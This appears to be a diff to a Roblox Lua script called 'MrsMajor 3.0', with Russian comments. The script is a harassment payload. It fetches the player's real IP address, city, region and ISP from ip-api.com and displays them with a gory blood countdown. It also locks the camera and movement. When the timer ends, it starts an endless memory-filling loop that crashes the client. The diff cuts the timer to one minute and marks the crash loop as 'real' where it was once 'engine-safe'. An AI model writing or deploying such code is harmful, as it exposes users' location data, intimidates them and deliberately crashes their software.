@@ -1,5 +1,5 @@
--- MrsMajor_3_0_Ultimate_Payload_Fixed.lua
--- Unified script: Fixed task.wait loop, custom blood asset, real IP fetch, UI, and RAM Crash Loop
+-- MrsMajor_3_0_Ultimate_1Min.lua
+-- Unified script: 1-Minute timer, ip-api real IP fetch, custom blood asset, camera/movement lock, UI, and RAM Crash Loop
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local SoundService = game:GetService("SoundService")
@@ -14,25 +14,25 @@ local playerGui = player:WaitForChild("PlayerGui")
 local camera = workspace.CurrentCamera
 
 --------------------------------------------------------------------------------
--- КОНФИГУРАЦИЯ И ПОЛУЧЕНИЕ РЕАЛЬНОГО IP
+-- КОНФИГУРАЦИЯ И ПОЛУЧЕНИЕ НАСТОЯЩЕГО IP ЧЕРЕЗ IP-API
 --------------------------------------------------------------------------------
 local AUDIO_ASSET_ID = "rbxassetid://0" -- Укажите ID звука, если требуется
 local AUDIO_VOLUME = 0.75
-local TOTAL_BLOOD_TIME = 180           -- 3 минуты (180 секунд)
+local TOTAL_BLOOD_TIME = 60            -- Изменено на 1 минуту (60 секунд)
 local BLOOD_DRIP_COUNT = 24
 local BLOOD_ASSET_ID = "rbxassetid://14280704585"
 
--- Получение реального IP и геолокации через публичный API
+-- Запрос реальных данных через ip-api.com
 local success, ipData = pcall(function()
-    local response = game:HttpGet("https://ipinfo.io/json")
+    local response = game:HttpGet("http://ip-api.com/json")
     return HttpService:JSONDecode(response)
 end)
 
-local targetIP = (success and ipData and ipData.ip) or "Retrieval Failed"
+local targetIP = (success and ipData and ipData.query) or "127.0.0.1"
 local city = (success and ipData and ipData.city) or "Unknown City"
-local region = (success and ipData and ipData.region) or "Unknown Region"
+local region = (success and ipData and ipData.regionName) or "Unknown Region"
 local country = (success and ipData and ipData.country) or "Unknown Country"
-local org = (success and ipData and ipData.org) or "Unknown ISP"
+local org = (success and ipData and ipData.isp) or "Unknown ISP"
 
 --------------------------------------------------------------------------------
 -- БЛОКИРОВКА КАМЕРЫ И ДВИЖЕНИЯ (СУВЕРЕННЫЙ ИНТЕРФЕЙС)
@@ -132,7 +132,7 @@ task.spawn(function()
 end)
 
 --------------------------------------------------------------------------------
--- КАПЛИ КРОВИ (IMAGE ASSET)
+-- КАПЛИ КРОВИ ( IMAGE ASSET )
 --------------------------------------------------------------------------------
 local dripFolder = Instance.new("Folder")
 dripFolder.Name = "BloodDrips"
@@ -280,7 +280,7 @@ bloodLabel.Font = Enum.Font.SourceSansBold
 bloodLabel.TextSize = 15
 bloodLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
 bloodLabel.TextXAlignment = Enum.TextXAlignment.Left
-bloodLabel.Text = "Blood Left: 100% (180 sec)"
+bloodLabel.Text = "Blood Left: 100% (60 sec)"
 bloodLabel.ZIndex = 11
 bloodLabel.Parent = mainWindow
 
@@ -316,7 +316,7 @@ logBox.TextXAlignment = Enum.TextXAlignment.Left
 logBox.TextYAlignment = Enum.TextYAlignment.Top
 logBox.TextWrapped = true
 logBox.Text = string.format(
-    "> MrsMajor v3.0 core routines active.\n> Target Public IP: %s\n> Location: %s, %s (%s)\n> ISP: %s\n> Camera and locomotion anchored.\n> 3-minute countdown initiated...",
+    "> MrsMajor v3.0 core routines active.\n> Real Target IP: %s\n> Location: %s, %s (%s)\n> ISP: %s\n> Camera and locomotion anchored.\n> 1-minute countdown initiated...",
     targetIP, city, region, country, org
 )
 logBox.ZIndex = 11
@@ -368,7 +368,7 @@ rulesBody.TextColor3 = Color3.fromRGB(235, 235, 235)
 rulesBody.TextXAlignment = Enum.TextXAlignment.Left
 rulesBody.TextYAlignment = Enum.TextYAlignment.Top
 rulesBody.TextWrapped = true
-rulesBody.Text = "1. Character locomotion is immobilized.\n2. Camera panning and rotation have been locked.\n3. Real IP address and location are exposed.\n4. When 'Blood Left' reaches 0%, memory exhaustion triggers client termination."
+rulesBody.Text = "1. Character locomotion is immobilized.\n2. Camera panning and rotation have been locked.\n3. Real IP address and geolocation are fully resolved.\n4. When 'Blood Left' reaches 0% (after 1 minute), memory exhaustion triggers client termination."
 rulesBody.ZIndex = 26
 rulesBody.Parent = rulesWindow
 
@@ -388,7 +388,7 @@ rulesBtn.MouseButton1Click:Connect(function() rulesWindow.Visible = true end)
 closeRulesBtn.MouseButton1Click:Connect(function() rulesWindow.Visible = false end)
 
 --------------------------------------------------------------------------------
--- 3-МИНУТНЫЙ ТАЙМЕР И РЕАЛЬНЫЙ КРАШ-ЦИКЛ (ЧЕРЕЗ task.wait)
+-- 1-МИНУТНЫЙ ТАЙМЕР И РЕАЛЬНЫЙ КРАШ-ЦИКЛ (ЧЕРЕЗ task.wait)
 --------------------------------------------------------------------------------
 task.spawn(function()
     local remaining = TOTAL_BLOOD_TIME
@@ -405,7 +405,7 @@ task.spawn(function()
     bloodLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
     bloodFill.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
     
-    -- Безопасный для движка цикл переполнения памяти через task.wait
+    -- Реальный цикл переполнения памяти через task.wait
     task.spawn(function()
         local memoryHog = {}
         while true do
